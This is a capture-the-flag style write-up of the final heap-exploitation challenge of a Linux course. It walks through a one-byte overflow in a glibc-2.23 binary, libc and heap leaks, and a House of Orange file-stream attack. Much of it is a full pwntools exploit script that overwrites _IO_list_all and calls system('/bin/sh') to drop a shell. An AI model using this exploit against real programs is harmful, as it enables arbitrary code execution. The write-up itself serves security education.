+++
date = '2026-10-08'
draft = false
title = 'OneByte'
categories = ["binary exploitation", "heap exploitation"]
+++

### Acknowledgement:

This challenge belongs to the [Linux Heap Exploitation 1](https://www.udemy.com/course/linux-heap-exploitation-part-1/) course by **Max Kamper** . It is the last and final challenge of this course. Max is a great teacher and a very experienced individual in this field and I highly recommend this course to anyone who wants a deep dive into linux heap exploitation .

### Challenge: 

We are given a binary which has all the modern protections turned on like PIE, NX, Stack Canary and FULL RELRO. It is linked against glibc-2.23.
On starting the binary we are given a menu which allows us to allocate new chunks , free them, read them, edit them,
and quit the binary. We can request for chunks only 16 times and on top of that the binary uses `calloc`
instead of `malloc` which means chunks are zeroed out when returned  to the user to prevent any kind of info leak. Also we don't control the size of the chunks as we are given only 0x60 sized chunks. The binary doesnot leak the libc address or the heap address by default.
Our goal is to **drop a shell**.

### My solution for the challenge:

#### Finding the bug: 

Upon inspection of the binary we can find out that there is a **one-byte overflow** and that is what the challenge name suggests. What can we do with a one-byte overflow ? Well... not a lot; but we control the least significant byte of the next chunk's size field which constitutes the flags like `PREV_INUSE` flag in its least significant nibble.

#### Writing the exploit:

The first thing that we need to do is getting an info leak . We need to leak the libc's load address and the heap's address. 

1. **Leaking the libc load address**

For leaking the libc's address we somehow need to make `malloc` write libc metadata to a chunk we can read from.But for that we need a chunk that is linked into one of the free lists(bins) and as a result will contain the linking metadata(pointers). But, what kind of free chunks contain libc metadata ? ... Well; as for the chunks linked against the **fastbin** their user data is repurposed as a **forward pointer** and this forward pointer contains address of the next chunk which is a heap address and hence is not currently useful for us. 
    As for the chunk that gets linked against the **unsorted bin** , its user data gets repurposed as a **forward pointer(fd)** and a **backward pointer(bk)**. If the chunk is linked as the first chunk, its **fd** and **bk** will contain the address of the head of the unsorted bin which resides inside the **main_arena** which is a data structure used to manage heap attached to the main thread. Since **main_arena** resides in the libc's *.data* section we can use this address to find the base of libc. 

Since we need a chunk that will get linked into an unsorted bin we need its size to be above 0x80 as any chunk lesser than or equal to 0x80 size will be linked into the appropriate fastbin when freed. Hence we can request 3 chunks from the program namely `A, B, C` and overwrite the B's size field with 0x91 using the one-byte overflow when writing data into chunk A . We can then create fake 0x30 chunk at 0x30 offset from the start of chunk C so that we have a sensible heap layout and at the same time prevent top-chunk consolidation when freeing the chunk B.

We can then free chunk B to link against the unsorted bin and then our heap will look something like this :-

![alt](/Images/heap1.png)

As we see there is the unsorted bin head's address in the fd and bk part of the chunk B . But unforunately we can't read that since we have freed chunk B. But what will happen if I request a new chunk now? 

Malloc will search if there is any free chunk in 0x60 sized fastbin or smallbin which it can return us. Since there isn't any it will then start searching the unsorted bin. It will find our 0x90 chunk and sort it into the appropriate small bin. Then it will do a **binmap** search to see which of the smallbins or largebins hold a chunk greater than 0x60 size. It will then find our 0x90 sized chunk in the smallbin and it will **remainder** that chunk and return us only the 0x60 portion out of it which is chunk B and will link the rest 0x30 part into the unsorted bin again. This process is called **remaindering**. Now, this 0x30 portion (the remainder) is the part of chunk C and it is a chunk we can read. Since this 0x30 chunk contains the link to the unsorted bin's head , we can easily read it and find the libc's base address by subtracting the correct offset.

Here is how the heap will look after calling malloc :- 

![alt](/Images/heap2.png)

Here is the code:-


```python
chunk_A = malloc()
chunk_B = malloc()
chunk_C = malloc()

payload1 = b"\x00"*0x58 + p8(0x91)
edit(chunk_A, payload1)
payload2 = b"\x00" * 0x28 + p64(0x31) # Creating the fake 0x30 chunk
edit(chunk_C, payload2)

free(chunk_B)

# Remaindering...
chunk_B = malloc()

addresses = read(chunk_C)
unsortedbin_addr = u64(addresses[:8])
main_arena_addr = unsortedbin_addr - 0x58
libc_addr = main_arena_addr - libc.sym.main_arena
log.info(f"Leaked libc load address: {hex(libc_addr)}")

libc.address = libc_addr
```

The above could also have been accomplished by requesting 4 chunks and overwriting chunkB's user data with 0xc0 and hence as a result we wouldn't have to create that 0x30 sized fake chunk inside chunk C as in this case chunk D will prevent top chunk consolidation. But I am trying to keep the number of malloc calls to minimum.


2. **Leaking the Heap Address:**

For leaking the heap address we can create a new chunk of 0x90 size and link it into the unsorted bin. Our previous remainder chunk which we can still read will have its bk pointing to this new chunk and we can read it and subtract appropriate value to get the heap's address. To create the fake chunk we can request 3 chunks again at the beginning and create the fake chunk. 

Here is the heap after the above operation :-

![alt](/Images/heap3.png)

Here is the code :-

```python

chunk_A = malloc()
chunk_B = malloc()
chunk_C = malloc()

chunk_D = malloc()
chunk_E = malloc()
chunk_F = malloc()

# ----- Leaking libc base address ----- 
payload1 = b"\x00"*0x58 + p8(0x91)
edit(chunk_A, payload1)
payload2 = b"\x00" * 0x28 + p64(0x31)
edit(chunk_C, payload2)

free(chunk_B)
# Remaindering...
chunk_B = malloc()

addresses = read(chunk_C)
unsortedbin_addr = u64(addresses[:8])
main_arena_addr = unsortedbin_addr - 0x58
libc_addr = main_arena_addr - libc.sym.main_arena
log.info(f"Leaked libc load address: {hex(libc_addr)}")

libc.address = libc_addr

# ----- Leaking heap address -----
# Setting up the unsorted chunk.

edit(chunk_D, b"\x00"*0x58 + p8(0x91))
edit(chunk_F, b"\x00"*0x28 + p64(0x31))

free(chunk_E)

heap_addr = u64(read(chunk_C)[8:16]) - 0x180
log.info(hex(heap_addr))

io.interactive()
```

3. **Using House of Orange for dropping the shell:**

We can use House of Orange primitive to drop a shell since we were able to leak the libc and heap addresses. To do that we have to overwrite the `_IO_list_all ptr` and point it into the main arena. We know that the _chain ptr of the first file stream after `_IO_list_all ptr` points into the main_arena overlaps the bk of the 0x60 smallbin and hence we would need a chunk that we could write to , to be present in the 0x60 smallbin so that we could link and create our own fake file stream there. But that is not so easily possible as the request size is 0x60 and hence during the searching process it will always be returned to us instead of getting sorted into the smallbin. 

How do we solve this issue ? We know that in the size field the 3 least significant bits are used as flags while
 the 4th least significant bit is normally set to 0 due to 16 byte alignment. During checking the size of a chunk malloc masks the flags . If we overwrite the 4th LSb, malloc will see that the resulting size after masking the flags is 0x68 which is not an exact fit for 0x60 sized chunk and hence sort it rather than allocating it. So the size field we have to set is 0x68 or 0x69 with PREV_INUSE flag set so that it gets sorted into the smallbin rather than getting allocated to us. 

To achieve the above we would need 2 chunks that we completely control linked into the unsorted bin . When malloc starts searching from the end of the unsorted bin , the last chunk should get sorted in the 0x60 smallbin and then the first chunk would get allocated to us. We will overwrite the bk of the first chunk with an address 16 bytes before the `_IO_list_all ptr`. During allocation , the first chunk will be partially unlinked and that is when the `_IO_list_all ptr` will be overwritten with the address of the head of the unsorted bin. Now since the chunk that got sorted into the 0x60 smallbin is controlled by us , we can then create a fake file stream there that satisfies the constraints for getting flushed. We will create the fake vtable in first chunk of the heap where we will overwrite the `__overflow` entry with the address of system. We will then quit the program which will trigger the machinery for stdio cleanup which calls the `_IO_flush_all_lockp` to flush the filestreams and that is when it will follow the `_chain` ptr of the first fake filestream in main arena to our crafted file stream and follow the vtable ptr to the vtable and then call the function pointed by `__overflow` which now points to the `system` function and its first argument will be the pointer to our file stream that has the first bytes set as **/bin/sh\00** and as a result a shell will be dropped.

The code below explains how to link 2 controlled chunks : 

```python
chunk_A = malloc()
chunk_B = malloc()
chunk_C = malloc()

chunk_D = malloc()
chunk_E = malloc()
chunk_F = malloc()

chunk_G = malloc()
chunk_H = malloc()

# ----- Leaking libc base address ----- 
payload1 = b"\x00"*0x58 + p8(0x91)
edit(chunk_A, payload1)
payload2 = b"\x00" * 0x28 + p64(0x31)
edit(chunk_C, payload2)

free(chunk_B)
# Remaindering...
chunk_B = malloc()

addresses = read(chunk_C)
unsortedbin_addr = u64(addresses[:8])
main_arena_addr = unsortedbin_addr - 0x58
libc_addr = main_arena_addr - libc.sym.main_arena
log.info(f"Leaked libc load address: {hex(libc_addr)}")

libc.address = libc_addr

# ----- Leaking heap address -----
# Setting up the unsorted chunk.

edit(chunk_D, b"\x00"*0x58 + p8(0x91))
edit(chunk_F, b"\x00"*0x28 + p64(0x31))

free(chunk_E)

heap_addr = u64(read(chunk_C)[8:16]) - 0x180
log.info(f"Leaked heap address: {hex(heap_addr)}")

# Restoring the heap state
edit(chunk_B, b"\x00"*0x58 + p8(0x61))
edit(chunk_D, b"\x00"*0x58 + p8(0x61))

chunk_C = malloc()
chunk_E = malloc()

# Creating 2 chunks to get them linked into the unsorted bin.

edit(chunk_A, b"\x00"*0x58 + p8(0xc1))
edit(chunk_D, b"\x00"*0x58 + p8(0xc1))

# Freeing those chunks
free(chunk_B)
free(chunk_E)

# Requesting a chunk due to which remaindering will take place and we will be returned
# chunk B. chunk C will still be linked into the unsorted bin and it is a chunk we control.
# Chunk E will be in the 0xc0 smallbin.
chunk_B = malloc()

# Overwriting the size of chunk C with 0x31 so that it doesnot get allocated to us again in the next
# malloc call and instead be sorted. Malloc will then remainder chunk_E and link chunk F into the unsorted bin.
# We control chunk F.
edit(chunk_B, b"\x00"*0x58 + p8(0x31))
unsortedbin_head_addr = libc.sym.main_arena + 0x58
edit(chunk_C, p64(unsortedbin_head_addr) * 2 + b"\x00"*0x18 + p64(0x31))

chunk_E = malloc()

# Since chunk C is now in 0x30 small bin we  will have to relink it again in unsorted bin. 
# We are going to overwrite the size field of chunk C with 0x61 to bring it to actual size 
# then we will overwrite size field of chunk D with 0x90 and freeing it
# which will lead to backward consolidation with chunk C and will get linked into the unsorted bin again.
#Hence we have 2 chunks linked into the unsortedbin whom we control completely.

edit(chunk_B, b"\x00"*0x58 + p8(0x61))
smallbin30_head_addr = libc.sym.main_arena + 0x78
edit(chunk_C, p64(smallbin30_head_addr)*2 + b"\x00"*0x40 + p64(0x60) + p64(0x90))
edit(chunk_E, b"\x00"*0x28 + p64(0x31)) # For a stable heap since chunk D is now 0x90 sized.

free(chunk_D)

# Now the unsorted bin contains chunk C as its first element and chunk_F as its last element.
# Since search for a chunk starts from the last of the unsorted bin... 
# what we are going to do is make chunk F 0x68 sized and chunk C 0x60 sized.
# So when malloc starts from last it will sort chunk F into the 0x60 small bin and then allocate chunkC .
# While allocating chunk C it will partially unlink it so we will overwrite the bk of chunk C with address
# 16 bytes before _IO_list_all ptr and as a result _IO_list_all will be overwritten.

edit(chunk_B, b"\x00"*0x58 + p8(0x61))
edit(chunk_E, b"\x00"*0x28 + p64(0x31) + b"\x00"*0x28 + p8(0x69))
edit(chunk_G, p64(0x58))

# Changing the bk of chunk C
edit(chunk_C, p64(0) + p64(libc.sym._IO_list_all - 16))
```

Before calling the final malloc() the heap should look like this : 

![alt](/Images/heap4.png)

Then we call the final malloc() : 

```python
malloc()
```

We get the follwing result now : 

![alt](/Images/gdb1.png)

As we can see that we have overwritten the `_IO_list_all ptr` with an address inside the main arena and now its
`_chain ptr` points to a chunk we control.

Now we will create a fake file stream in the chunk pointed by `_chain` and a fake vtable : 

```python
# Now we are going to create the fake filestream at chunk_F which is being pointed to by the
# _chain ptr.

# Setting the flag
flag = b"/bin/sh\00"
edit(chunk_E, b"\x00"*0x50 + flag + p8(0x61))

# Fake chunk F part
# Setting the write base and write ptr to pass the checks.

write_base = 0x1
write_ptr = 0x2
fakef = p64(libc.sym.main_arena + 168) * 2 +  p64(write_base) + p64(write_ptr) \
        + p64(0) * 0x38
edit(chunk_F, fakef)

# Fake chunk G part
# Setting the _mode field to 0x0 to pass buffer flushing checks.
# Required _mode field value is <= 0x0.

edit(chunk_G, b"\x00"*0x10)
edit(chunk_G, b"\x00"*0x10)

# fake chunk_H part for overwriting the vtable ptr with address of chunk A
# and setting up the fake vtable at the start of heap so that _overflow entry is replaced with system.

edit(chunk_H, p64(0) + p64(heap_addr + 0x10))
edit(chunk_A, p64(0)*3 + p64(libc.sym.system))
```

Then we will call the call `quit()` to trigger the exploit :

```python
# calling the quit option to trigger the exploit
io.send(b"5")
```

Now we get a shell:

![alt](/Images/shell1.png)


Here is the full exploit : 

```python
chunk_A = malloc()
chunk_B = malloc()
chunk_C = malloc()

chunk_D = malloc()
chunk_E = malloc()
chunk_F = malloc()

chunk_G = malloc()
chunk_H = malloc()

# ----- Leaking libc base address ----- 
payload1 = b"\x00"*0x58 + p8(0x91)
edit(chunk_A, payload1)
payload2 = b"\x00" * 0x28 + p64(0x31)
edit(chunk_C, payload2)

free(chunk_B)
# Remaindering...
chunk_B = malloc()

addresses = read(chunk_C)
unsortedbin_addr = u64(addresses[:8])
main_arena_addr = unsortedbin_addr - 0x58
libc_addr = main_arena_addr - libc.sym.main_arena
log.info(f"Leaked libc load address: {hex(libc_addr)}")

libc.address = libc_addr

# ----- Leaking heap address -----
# Setting up the unsorted chunk.

edit(chunk_D, b"\x00"*0x58 + p8(0x91))
edit(chunk_F, b"\x00"*0x28 + p64(0x31))

free(chunk_E)

heap_addr = u64(read(chunk_C)[8:16]) - 0x180
log.info(f"Leaked heap address: {hex(heap_addr)}")

# Restoring the heap state
edit(chunk_B, b"\x00"*0x58 + p8(0x61))
edit(chunk_D, b"\x00"*0x58 + p8(0x61))

chunk_C = malloc()
chunk_E = malloc()

# Creating 2 chunks to get them linked into the unsorted bin.

edit(chunk_A, b"\x00"*0x58 + p8(0xc1))
edit(chunk_D, b"\x00"*0x58 + p8(0xc1))

# Freeing those chunks
free(chunk_B)
free(chunk_E)

# Requesting a chunk due to which remaindering will take place and we will be returned
# chunk B. chunk C will still be linked into the unsorted bin and it is a chunk we control.
# Chunk E will be in the 0xc0 smallbin.
chunk_B = malloc()

# Overwriting the size of chunk C with 0x31 so that it doesnot get allocated to us again in the next
# malloc call and instead be sorted. Malloc will then remainder chunk_E and link chunk F into the unsorted bin.
# We control chunk F.
edit(chunk_B, b"\x00"*0x58 + p8(0x31))
unsortedbin_head_addr = libc.sym.main_arena + 0x58
edit(chunk_C, p64(unsortedbin_head_addr) * 2 + b"\x00"*0x18 + p64(0x31))

chunk_E = malloc()

# Since chunk C is now in 0x30 small bin we  will have to relink it again in unsorted bin. 
# We are going to overwrite the size field of chunk C with 0x61 to bring it to actual size 
# then we will overwrite size field of chunk D with 0x90 and freeing it
# which will lead to backward consolidation with chunk C and will get linked into the unsorted bin again.
#Hence we have 2 chunks linked into the unsortedbin whom we control completely.

edit(chunk_B, b"\x00"*0x58 + p8(0x61))
smallbin30_head_addr = libc.sym.main_arena + 0x78
edit(chunk_C, p64(smallbin30_head_addr)*2 + b"\x00"*0x40 + p64(0x60) + p64(0x90))
edit(chunk_E, b"\x00"*0x28 + p64(0x31)) # For a stable heap since chunk D is now 0x90 sized.

free(chunk_D)

# Now the unsorted bin contains chunk C as its first element and chunk_F as its last element.
# Since search for a chunk starts from the last of the unsorted bin... 
# what we are going to do is make chunk F 0x68 sized and chunk C 0x60 sized.
# So when malloc starts from last it will sort chunk F into the 0x60 small bin and then allocate chunkC .
# While allocating chunk C it will partially unlink it so we will overwrite the bk of chunk C with address
# 16 bytes before _IO_list_all ptr and as a result _IO_list_all will be overwritten.

edit(chunk_B, b"\x00"*0x58 + p8(0x61))
edit(chunk_E, b"\x00"*0x28 + p64(0x31) + b"\x00"*0x28 + p8(0x69))
edit(chunk_G, p64(0x58))

# Changing the bk of chunk C
edit(chunk_C, p64(0) + p64(libc.sym._IO_list_all - 16))

# calling the final malloc to triger everything
malloc()

# Now we are going to create the fake filestream at chunk_F which is being pointed to by the
# _chain ptr.

# Setting the flag
flag = b"/bin/sh\00"
edit(chunk_E, b"\x00"*0x50 + flag + p8(0x61))

# Fake chunk F part
# Setting the write base and write ptr to pass the checks.

write_base = 0x1
write_ptr = 0x2
fakef = p64(libc.sym.main_arena + 168) * 2 +  p64(write_base) + p64(write_ptr) \
        + p64(0) * 0x38
edit(chunk_F, fakef)

# Fake chunk G part
# Setting the _mode field to 0x0 to pass buffer flushing checks
# Required _mode field value is <= 0x0.

edit(chunk_G, b"\x00"*0x10)
edit(chunk_G, b"\x00"*0x10)

# fake chunk_H part for overwriting the vtable ptr with address of chunk A
# and setting up the fake vtable at the start of heap so that _overflow entry is replaced with system.

edit(chunk_H, p64(0) + p64(heap_addr + 0x10))
edit(chunk_A, p64(0)*3 + p64(libc.sym.system))

# calling the quit option to trigger the exploit
io.send(b"5")

io.interactive()
```

### Note: 
Our exploit is not 100% reliable. This is because of the reason how the `_mode` field of the fake filestream that overlaps the `main_arena` is formed. `_mode` is a 32 bit field and is formed by overlapping the least significant bytes of the 0xc0 smallbin.This results in its most significant bit that determines whether it's interpreted as positive or negative value or not is subject to ASLR. As a result sometimes if the `_mode` field is positive the fake file stream overlapping the main arena may pass the second buffer flushing check, leading to calling a corrupted `__overflow` entry leading to segfault.

